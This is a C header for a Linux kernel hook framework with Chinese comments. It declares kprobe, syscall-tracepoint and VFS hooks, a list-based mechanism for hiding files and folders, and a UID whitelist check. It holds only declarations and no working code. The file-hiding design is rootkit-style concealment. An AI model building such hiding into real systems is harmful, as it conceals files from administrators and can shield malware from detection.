/*
 * HOOK - 内核通用 Hook 框架
 * 支持 5.10 - 6.12 内核版本
 * 
 * 特性:
 * - Kprobe 通用 Hook
 * - Syscall tracepoint hook
 * - VFS hook (隐藏文件/文件夹)
 */

#ifndef _HOOK_H
#define _HOOK_H

#include <linux/types.h>
#include <linux/uidgid.h>
#include <linux/spinlock.h>

/* Hook 类型 */
#define HOOK_TYPE_KPROBE      0x01
#define HOOK_TYPE_TRACEPOINT  0x02
#define HOOK_TYPE_SYSCALL     0x04

/* 初始化/退出 */
int hook_init(void);
void hook_exit(void);

/* 注册 Hook */
int hook_register(const char *name, void *handler);
void hook_unregister(const char *name);

/* Hidden file/folder management */
#define MAX_HIDDEN_FILES 64

struct hidden_entry {
    char name[256];
    bool is_dir;
    bool active;
};

int add_hidden_file(const char *name, bool is_dir);
int remove_hidden_file(const char *name);
bool is_hidden(const char *name, bool is_dir);
void clear_hidden_list(void);

/* 白名单 UID 检查 (可选) */
bool should_hook_uid(uid_t uid);

#endif /* _HOOK_H */
